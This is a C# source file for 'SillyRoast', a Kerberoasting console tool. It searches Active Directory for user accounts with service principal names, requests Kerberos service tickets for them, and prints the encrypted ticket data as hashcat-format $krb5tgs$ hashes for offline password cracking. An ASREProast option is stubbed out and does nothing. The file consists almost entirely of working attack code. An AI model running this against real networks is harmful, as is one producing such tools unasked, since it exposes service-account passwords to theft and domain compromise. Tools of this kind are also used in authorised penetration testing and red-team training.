using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Net.Sockets;
using Asn1;
using System.DirectoryServices.ActiveDirectory;

namespace SillyRoast
{
    internal class Program
    {

        static string GetCurrentDomainPath()
        {
            DirectoryEntry de = new DirectoryEntry("LDAP://RootDSE");

            return "LDAP://" + de.Properties["defaultNamingContext"][0].ToString();
        }

        static string[] Query(string query)
        {
            SearchResultCollection results;
            DirectorySearcher ds = null;

            DirectoryEntry de = new DirectoryEntry(GetCurrentDomainPath());
            de.AuthenticationType = AuthenticationTypes.Secure;
            ds = new DirectorySearcher(de);
            ds.Filter = query;

            results = ds.FindAll();

            var spns = new List<string>();
            foreach (SearchResult sr in results)
            {
                // Using the index zero (0) is required!
                spns.Add(sr.Properties["name"][0].ToString());

            }

            return spns.ToArray();
        }

        static bool Kerberoast(string[] args)
        {
            string spnFilter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";
            string[] spns = Query(spnFilter);

            System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
            for (int i = 0; i < spns.Length; i++)
            {

                long encType = 0;
                ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spns[i]);
                byte[] requestBytes = ticket.GetRequest();

                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                AsnElt apRep = AsnElt.Decode(apReqBytes);
                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        string hash = "";

                                        if ((encType == 18) || (encType == 17))
                                        {
                                            //Ensure checksum is extracted from the end for aes keys
                                            int checksumStart = cipherText.Length - 24;
                                            //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, "", "", spns[i], cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        }
                                        //if encType==23
                                        else
                                        {
                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, "", "", spns[i], cipherText.Substring(0, 32), cipherText.Substring(32));
                                        }

                                        Console.WriteLine(hash);
                                    }
                                }
                            }
                        }
                    }

                }
            }

            return true;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("\r\n\r\n███████╗██╗██╗     ██╗  ██╗   ██╗██████╗  ██████╗  █████╗ ███████╗████████╗\r\n██╔════╝██║██║     ██║  ╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝\r\n███████╗██║██║     ██║   ╚████╔╝ ██████╔╝██║   ██║███████║███████╗   ██║   \r\n╚════██║██║██║     ██║    ╚██╔╝  ██╔══██╗██║   ██║██╔══██║╚════██║   ██║   \r\n███████║██║███████╗███████╗██║   ██║  ██║╚██████╔╝██║  ██║███████║   ██║   \r\n╚══════╝╚═╝╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝ ");
            Console.WriteLine("Kerberoast and ASREProast very silly - v0.1\n");

            if (args.Length > 0)
            {
                switch (args[0])
                {
                    case "kerberoast":
                        Console.WriteLine("Kerberoasting...");
                        bool didgo = Kerberoast(args);
                        break;
                    case "asreproast":
                        Console.WriteLine("ASREProasting...");
                        break;
                }

            }
            else
            {
                Console.WriteLine("Please supply arguments: Type \"--help\" to see a list of commands\n");
            }



        }
    }
}
